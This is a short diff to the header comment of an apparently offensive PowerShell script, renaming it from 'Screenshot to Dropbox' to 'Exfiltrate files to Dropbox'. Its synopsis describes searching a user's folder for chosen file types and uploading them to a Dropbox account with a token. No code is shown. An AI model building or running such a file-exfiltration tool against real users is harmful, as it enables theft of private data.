@@ -1,5 +1,5 @@
 <#
-============================================= Screenshot to Dropbox ========================================================
+============================================= Exfiltrate files to Dropbox ========================================================
 
 SYNOPSIS
 This script searches for specific filetypes in the users folder and posts to a Dropbox account (developer app and token required).
